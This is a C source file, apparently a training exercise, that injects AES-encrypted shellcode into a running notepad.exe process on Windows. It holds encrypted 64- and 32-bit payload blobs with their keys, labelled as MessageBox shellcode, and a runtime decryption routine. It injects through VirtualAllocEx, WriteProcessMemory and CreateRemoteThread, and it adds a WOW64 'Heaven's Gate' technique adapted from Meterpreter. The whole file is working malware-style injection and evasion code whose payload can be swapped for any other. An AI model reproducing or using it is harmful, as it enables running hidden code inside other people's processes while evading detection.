#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")


// MessageBox shellcode - 64-bit
unsigned char payload64[] = { 0xa3, 0xec, 0x0, 0xc6, 0x64, 0xe1, 0x9d, 0x30, 0x8, 0xa, 0x83, 0xaa, 0x9b, 0x9b, 0xc9, 0xf8, 0xce, 0xe0, 0x9d, 0x6b, 0x38, 0x9a, 0x98, 0x19, 0x92, 0xf9, 0x53, 0xec, 0xe1, 0x22, 0xc7, 0x47, 0x10, 0x93, 0xab, 0xd2, 0x80, 0x5e, 0xaa, 0x45, 0x6d, 0x2b, 0x7a, 0x9a, 0x46, 0x2d, 0xea, 0x94, 0x55, 0x3a, 0x48, 0xbe, 0xc3, 0xc3, 0xd9, 0x39, 0x9a, 0xd7, 0xf3, 0x59, 0x8b, 0xb8, 0xc6, 0xf7, 0xf3, 0xb9, 0xdb, 0xe5, 0x76, 0x9a, 0xa, 0xde, 0xb1, 0x5b, 0x5f, 0xe5, 0xd8, 0x25, 0xf5, 0x93, 0x2d, 0x5a, 0x8a, 0x37, 0xa9, 0x3, 0x6e, 0x99, 0x8d, 0xa8, 0x46, 0x5f, 0x6c, 0x30, 0xa2, 0xcf, 0xa4, 0xd3, 0xa4, 0x6e, 0x1f, 0x61, 0x8f, 0xf7, 0x74, 0x36, 0xaf, 0xa5, 0x1a, 0x3d, 0xe, 0x53, 0x27, 0x21, 0x75, 0x50, 0xe0, 0x9, 0x80, 0x86, 0xfe, 0xf5, 0x67, 0x1c, 0x7f, 0x7b, 0x9c, 0x18, 0x87, 0xf8, 0xaa, 0x97, 0x49, 0x12, 0xb6, 0xff, 0x37, 0x65, 0xf1, 0xbb, 0x37, 0xf6, 0x20, 0x4b, 0xa7, 0x6d, 0x64, 0xa7, 0xf7, 0xa4, 0xa6, 0x8b, 0x4d, 0xf5, 0x61, 0xf6, 0x18, 0x94, 0xe1, 0xb8, 0x3f, 0xf7, 0xba, 0x1c, 0x67, 0xde, 0xea, 0xd3, 0x5f, 0xdd, 0xc, 0xb9, 0xf, 0x8, 0x73, 0xc6, 0x83, 0xc7, 0xef, 0x2b, 0x6d, 0xba, 0x79, 0xb3, 0x69, 0xec, 0xe2, 0xee, 0x28, 0x89, 0x4c, 0x6d, 0x10, 0x1f, 0xf8, 0xc7, 0x40, 0xc3, 0x64, 0x32, 0xe2, 0x7f, 0x5e, 0x91, 0x35, 0x3e, 0xa4, 0xe7, 0x92, 0xa3, 0x3b, 0x53, 0x9e, 0xa0, 0xa0, 0x36, 0x3, 0x37, 0x3f, 0x99, 0x6b, 0x9b, 0x8d, 0x4c, 0x15, 0x5f, 0x77, 0xff, 0x68, 0xfc, 0x9, 0x46, 0xde, 0x35, 0xe4, 0x98, 0xd9, 0xcd, 0xbb, 0xab, 0xee, 0xc5, 0x14, 0x26, 0x52, 0x8e, 0xb0, 0x7f, 0x69, 0x96, 0xb3, 0x21, 0x7c, 0x21, 0xb0, 0x4a, 0xe6, 0x50, 0x2a, 0x9b, 0x97, 0x65, 0x68, 0x19, 0xd8, 0x90, 0xcb, 0xbd, 0x26, 0x53, 0x2d, 0x58, 0xb2, 0x25, 0x43, 0x25, 0x6a, 0xf7, 0xa2, 0xea, 0xd2, 0x29, 0x9f, 0x36, 0xab, 0x31, 0x5f, 0x8f, 0xcc, 0xe4, 0x5b, 0xc4, 0x67, 0xae, 0x9e, 0x11, 0x30, 0xd8, 0x2e, 0xd5, 0x34, 0x88, 0xe9, 0xba, 0x72, 0x45, 0xb2, 0x8a, 0xd3, 0xd0, 0x79, 0x43, 0xe0, 0xa3, 0x5, 0x7d, 0x84, 0xc9, 0xc4, 0xe9 };
unsigned int payload64_len = sizeof(payload64);
unsigned char key64[] = { 0x8d, 0x2b, 0x85, 0xb4, 0xc3, 0x99, 0x8e, 0x50, 0xa0, 0xbf, 0x4c, 0xf2, 0xa4, 0x9c, 0xd0, 0xaa };
// MessageBox shellcode - 32-bit
unsigned char payload32[] = { 0xc5, 0xae, 0x20, 0xf0, 0x9d, 0xd9, 0x1, 0x8e, 0x3, 0xed, 0x7, 0x47, 0xd3, 0x3d, 0x92, 0x1d, 0x74, 0x2a, 0xb2, 0xbb, 0x29, 0x1f, 0xa7, 0xe2, 0x71, 0xa5, 0xb8, 0x52, 0x50, 0xeb, 0xfd, 0x89, 0x5c, 0x7c, 0x13, 0x2b, 0x8c, 0x8d, 0x5a, 0x2b, 0x36, 0x35, 0x75, 0xd8, 0xc1, 0xf7, 0xa2, 0x4f, 0x7f, 0x46, 0x7e, 0x8e, 0x16, 0xbf, 0x3c, 0xde, 0xa3, 0x5c, 0xbb, 0x3, 0x9f, 0x8e, 0x37, 0xc2, 0x81, 0x81, 0xee, 0x27, 0x1c, 0xa2, 0xf2, 0x47, 0x76, 0x4, 0x7a, 0xfb, 0x86, 0x1d, 0xd3, 0x8f, 0x1c, 0xda, 0x6, 0x92, 0x1c, 0xad, 0xa8, 0xb, 0x2c, 0x17, 0x33, 0xa7, 0x62, 0xa, 0x89, 0x8b, 0x43, 0x6a, 0xa2, 0x22, 0xce, 0xcf, 0x3d, 0x48, 0x13, 0x94, 0xbe, 0x91, 0xcb, 0x12, 0x63, 0x24, 0xc9, 0x8a, 0xfa, 0x3e, 0x37, 0xe4, 0x4f, 0x57, 0xe9, 0x6e, 0xf6, 0xb9, 0x3e, 0x91, 0x89, 0x52, 0x59, 0x25, 0xb4, 0xa1, 0x32, 0x6a, 0x3d, 0x26, 0xdc, 0xae, 0x94, 0x68, 0x41, 0xe9, 0xed, 0x47, 0xb9, 0xae, 0x4e, 0x81, 0x33, 0xea, 0xce, 0x9, 0x49, 0x94, 0x8e, 0x4f, 0x10, 0x55, 0x84, 0x6b, 0x34, 0xb3, 0xca, 0xcd, 0xf1, 0xaf, 0xfc, 0xc, 0xc3, 0xb7, 0xed, 0x9, 0xc5, 0xba, 0xfd, 0xf0, 0xaf, 0x27, 0xeb, 0xe6, 0xdd, 0x2f, 0x1, 0x21, 0x61, 0xfd, 0x8d, 0x9d, 0x55, 0x3d, 0xc6, 0x12, 0x53, 0x89, 0xda, 0x50, 0xa8, 0x37, 0xb5, 0x43, 0xdb, 0x3b, 0x6c, 0x65, 0x6e, 0xba, 0xd1, 0x90, 0x98, 0x9c, 0xa3, 0x63, 0xb8, 0x39, 0xd3, 0x2d, 0xde, 0xfa, 0xd6, 0x4e, 0x70, 0x95, 0xa0, 0xda, 0xe8, 0x31, 0x6e, 0x69, 0x1f, 0x88, 0x93, 0xb6, 0x29, 0x6e, 0x9d, 0x9d, 0x22, 0x5e, 0x9e, 0x93, 0xf6, 0xf7, 0xeb, 0xcb, 0x24, 0xdb, 0x4, 0x2f, 0x8f, 0x65, 0xb2, 0x5a, 0x48, 0xfc, 0xff, 0x11, 0x69, 0x1a, 0xd5, 0x9, 0xd6, 0x6d, 0xa4, 0x25, 0xe7, 0x24, 0x59, 0x56, 0x9e, 0x3c, 0xf1, 0x1d, 0x16, 0x6c, 0xaf, 0xf1, 0x8, 0x5, 0x69, 0xc0, 0x85, 0x0, 0x76, 0x7, 0xe2, 0x25, 0x64, 0x97 };
unsigned int payload32_len = sizeof(payload32);
unsigned char key32[] = { 0x1f, 0xcb, 0x5d, 0xf, 0xf9, 0x7d, 0x22, 0x2a, 0xa6, 0x85, 0x98, 0xe5, 0x4a, 0xf3, 0xd7, 0x7b };

// Definitions used for running native x64 code from a wow64 process
// (src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.h)
typedef BOOL (WINAPI * X64FUNCTION)( DWORD dwParameter );
typedef DWORD (WINAPI * EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );

// The context used for injection via migrate_via_remotethread_wow64
typedef struct _WOW64CONTEXT {
        union   {
                HANDLE hProcess;
                BYTE bPadding2[8];
        } h;

        union   {
                LPVOID lpStartAddress;
                BYTE bPadding1[8];
        } s;

        union   {
                LPVOID lpParameter;
                BYTE bPadding2[8];
        } p;
        union   {
                HANDLE hThread;
                BYTE bPadding2[8];
        } t;
} WOW64CONTEXT, * LPWOW64CONTEXT;


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                        return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                        return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                        return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                        return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
                        return -1;
        }      
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        return 0;
}

int FindTarget(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0;
                
        hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!Process32First(hProcSnap, &pe32)) {
                CloseHandle(hProcSnap);
                return 0;
        }
                
        while (Process32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        CloseHandle(hProcSnap);
                
        return pid;
}

// Injection payload x64
int Inject64(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;

	AESDecrypt((char *) payload, payload_len, (char *) key64, sizeof(key64));
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
	
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}
// injection payload x86 
int Inject32(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;

	AESDecrypt((char *) payload, payload_len, (char *) key32, sizeof(key32));
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	hThread = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, 0, NULL);
	
	if (hThread != NULL) {
			WaitForSingleObject(hThread, 500);
			CloseHandle(hThread);
			return 0;
	}
	return -1;
}


HANDLE FindThread(int pid){

	HANDLE hThread = NULL;
	THREADENTRY32 thEntry;

	thEntry.dwSize = sizeof(thEntry);
    HANDLE Snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
		
	while (Thread32Next(Snap, &thEntry)) {
		if (thEntry.th32OwnerProcessID == pid) 	{
			hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thEntry.th32ThreadID);
			break;
		}
	}
	CloseHandle(Snap);
	
	return hThread;
}

int InjectWOW64(HANDLE hProc, unsigned char * payload, unsigned int payload_len,  unsigned char * key, unsigned int key_len ) {
//	src: https://github.com/rapid7/meterpreter/blob/5e24206d510a48db284d5f399a6951cd1b4c754b/source/common/arch/win/i386/base_inject.c

	LPVOID pRemoteCode = NULL;
	EXECUTEX64 pExecuteX64   = NULL;
	X64FUNCTION pX64function = NULL;
	WOW64CONTEXT * ctx       = NULL;

	// AES-encrypted sh_executex64 function (switches to 64-bit mode and runs sh_wownativex)
	unsigned char sh_executex64[] = { 0xf7, 0x69, 0x26, 0xaf, 0x10, 0x56, 0x2a, 0xcc, 0xeb, 0x96, 0x6b, 0xd0, 0xb8, 0xe3, 0x4d, 0x44, 0x16, 0xb0, 0xf8, 0x9d, 0x32, 0xd9, 0x65, 0x12, 0xa2, 0x9e, 0xec, 0x5d, 0x37, 0xde, 0x34, 0x9a, 0x94, 0x19, 0xc7, 0xa5, 0xe6, 0xe8, 0x3e, 0xa2, 0x1d, 0x5a, 0x77, 0x25, 0xcb, 0xc, 0xcd, 0xd0, 0x59, 0x11, 0x3c, 0x2d, 0x4d, 0x16, 0xf1, 0x95, 0x3a, 0x33, 0x0, 0xb4, 0x3, 0x55, 0x98, 0x6f, 0x61, 0x84, 0x61, 0x2b, 0x8a, 0xe8, 0x53, 0x47, 0xaa, 0x58, 0xfc, 0x70, 0x91, 0xcd, 0xa9, 0xb1 };
	unsigned int sh_executex64_len = sizeof(sh_executex64);
	unsigned char sh_executex64_key[] = { 0x26, 0x96, 0xcc, 0x43, 0xca, 0x1f, 0xf8, 0xa, 0xe5, 0xcc, 0xbf, 0xf1, 0x2f, 0xc9, 0xae, 0x71 };
	size_t sh_executex64_key_len = sizeof(sh_executex64_key);

	// AES-encrypted sh_wownativex function (calling RtlCreateUserThread in target process)
	unsigned char sh_wownativex[] = { 0x20, 0x8f, 0x32, 0x33, 0x59, 0xa1, 0xce, 0x2f, 0xf8, 0x8b, 0xa, 0xb4, 0x2a, 0x7f, 0xe6, 0x26, 0xe4, 0xd1, 0x4e, 0x25, 0x38, 0x57, 0xdd, 0xc4, 0x2c, 0x1c, 0x10, 0x2b, 0x70, 0x0, 0x9, 0x67, 0x5c, 0x70, 0x6d, 0x67, 0x4f, 0x27, 0xe8, 0xaf, 0xa1, 0x6f, 0x10, 0x42, 0x73, 0x9d, 0x4a, 0xb1, 0x6, 0x22, 0x89, 0xef, 0xac, 0x40, 0xd7, 0x93, 0x94, 0x6e, 0x4c, 0x6e, 0xf4, 0xcb, 0x46, 0x4d, 0xf3, 0xe8, 0xb5, 0x36, 0x11, 0xa6, 0xad, 0xeb, 0x8d, 0xda, 0xa0, 0x54, 0x75, 0xd9, 0xf3, 0x41, 0x34, 0xb3, 0xa6, 0x70, 0x41, 0x3e, 0xf3, 0x96, 0x97, 0x12, 0x74, 0x6b, 0x2e, 0x36, 0x31, 0x26, 0x86, 0x2, 0x24, 0x59, 0x40, 0xb9, 0xbb, 0x2b, 0xa2, 0x98, 0xbe, 0x15, 0x73, 0xb5, 0x90, 0x39, 0xe5, 0x82, 0xbb, 0xdd, 0x7, 0xe9, 0x9d, 0x89, 0x9a, 0x9e, 0x5f, 0x94, 0xde, 0x2, 0x80, 0x36, 0x45, 0x5d, 0x8e, 0xe6, 0x5e, 0x2c, 0x58, 0x59, 0xf4, 0xf7, 0xa0, 0xbf, 0x7e, 0x94, 0xff, 0x50, 0xf0, 0x76, 0x74, 0x2f, 0xd1, 0x91, 0x18, 0x65, 0x12, 0x30, 0xfa, 0x4, 0x61, 0xa5, 0x4d, 0x25, 0x57, 0xf4, 0x52, 0x99, 0xa2, 0x93, 0x67, 0xe1, 0x6, 0x43, 0x4b, 0x55, 0x53, 0x67, 0x89, 0x18, 0x71, 0x72, 0xdb, 0x82, 0xef, 0x5b, 0xdc, 0x8b, 0xb0, 0x91, 0xf5, 0x58, 0xe4, 0x85, 0xc3, 0x80, 0x7b, 0x79, 0x21, 0x3a, 0x60, 0x99, 0xc5, 0x62, 0x2c, 0x73, 0xa4, 0x2b, 0xe2, 0xc, 0xda, 0xa2, 0x88, 0x6b, 0x2f, 0x38, 0x80, 0xfd, 0xb1, 0xaf, 0xea, 0x4f, 0xb5, 0x0, 0xda, 0x46, 0x46, 0x9d, 0x23, 0xdd, 0xe3, 0x4a, 0xf5, 0xc9, 0x8, 0xf0, 0x97, 0xa9, 0x55, 0x71, 0xda, 0x84, 0xa9, 0xf5, 0xcb, 0x1f, 0xb9, 0xb9, 0x67, 0xf7, 0xf2, 0x2f, 0x2a, 0x56, 0x3, 0xe1, 0x56, 0x26, 0xb4, 0x3a, 0xd9, 0xe2, 0x11, 0x8a, 0x8f, 0xef, 0x8c, 0x89, 0xc0, 0x26, 0x9c, 0x9f, 0xe5, 0x18, 0xd4, 0xd7, 0xae, 0x91, 0xbf, 0x2b, 0x14, 0xbb, 0xfd, 0xe0, 0xb5, 0x9c, 0x9d, 0x81, 0x71, 0x5d, 0xdd, 0xe6, 0x5d, 0x8a, 0xe6, 0x61, 0xf2, 0x69, 0xf8, 0x95, 0x4f, 0xcd, 0xe3, 0x52, 0x1f, 0x14, 0xe5, 0x8c };
	unsigned int sh_wownativex_len = sizeof(sh_wownativex);
	unsigned char sh_wownativex_key[] = { 0xe5, 0x53, 0xc4, 0x11, 0x75, 0x14, 0x86, 0x8f, 0x59, 0x35, 0x7c, 0xc7, 0x8b, 0xc5, 0xdc, 0x2d };
	size_t sh_wownativex_key_len = sizeof(sh_wownativex_key);

	// inject payload into target process
	AESDecrypt((char *) payload, payload_len, (char *) key, key_len);
	pRemoteCode = VirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	WriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);

	printf("remcode = %p\n", pRemoteCode); getchar();
	
	// alloc a RW buffer in this process for the EXECUTEX64 function
	pExecuteX64 = (EXECUTEX64)VirtualAlloc( NULL, sizeof(sh_executex64), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );
	// alloc a RW buffer in this process for the X64FUNCTION function (and its context)
	pX64function = (X64FUNCTION)VirtualAlloc( NULL, sizeof(sh_wownativex)+sizeof(WOW64CONTEXT), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE );

	printf("pExecuteX64 = %p ; pX64function = %p\n", pExecuteX64, pX64function); getchar();

	// decrypt and copy over the wow64->x64 stub
	AESDecrypt((char *) sh_executex64, sh_executex64_len, (char *) sh_executex64_key, sh_executex64_key_len);
	memcpy( pExecuteX64, sh_executex64, sh_executex64_len );
	VirtualAlloc( pExecuteX64, sizeof(sh_executex64), MEM_COMMIT, PAGE_EXECUTE_READ );

	// decrypt and copy over the native x64 function
	AESDecrypt((char *) sh_wownativex, sh_wownativex_len, (char *) sh_wownativex_key, sh_wownativex_key_len);
	memcpy( pX64function, sh_wownativex, sh_wownativex_len );

	// pX64function shellcode modifies itself during the runtime, so memory has to be RWX
	VirtualAlloc( pX64function, sizeof(sh_wownativex)+sizeof(WOW64CONTEXT), MEM_COMMIT, PAGE_EXECUTE_READWRITE );

	// set the context
	ctx = (WOW64CONTEXT *)( (BYTE *)pX64function + sh_wownativex_len );

	ctx->h.hProcess       = hProc;
	ctx->s.lpStartAddress = pRemoteCode;
	ctx->p.lpParameter    = 0;
	ctx->t.hThread        = NULL;

	printf("hit me...\n"); getchar();
	
	// run a new thread in target process
	pExecuteX64( pX64function, (DWORD)ctx );
	
	if( ctx->t.hThread ) {
		// if success, resume the thread -> execute payload
		printf("Thread should be there, frozen...\n"); getchar();
		ResumeThread(ctx->t.hThread);

		// cleanup in target process
		VirtualFree(pExecuteX64, 0, MEM_RELEASE);
		VirtualFree(pX64function, 0, MEM_RELEASE);

		return 0;
	}
	else
		return 1;
}



//payload x64 == notepad 64 --> compiler 64 OK 
//payload x64 == notepad 64 --> compiler 32 OK 
//payload x86 == notepad 32 --> compiler 64 OK
//payload x86 == notepad 32 --> compiler 32 OK


//payload x64 --> notepad 64 --> compiler 64 OK
//payload x86 --> notepad 32 --> compiler 64 OK


//Inject WOW64
//payload x64 --> notepad 64 --> compiler 32 OK
//payload x86 --> notepad 32 --> compiler 32 OK


int main(void) {
    DWORD lpid = GetCurrentProcessId();
	printf("[main] Init program %d \n", lpid);
	getchar();
	int pid = 0;
    HANDLE hProc = NULL;

	pid = FindTarget("notepad.exe");

	if (pid) {
		printf("Notepad.exe PID = %d\n", pid);
		// try to open target process
		hProc = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			// binx64 Inject32(hProc, payload32, payload32_len);
			// binx64 Inject64(hProc, payload64, payload64_len);
			/* binx86 */ InjectWOW64(hProc, payload64, payload64_len, key64, sizeof(key64));
			// binx86 InjectWOW64(hProc, payload32, payload32_len, key32, sizeof(key32));
			CloseHandle(hProc);
		}
	}
	return 0;
}
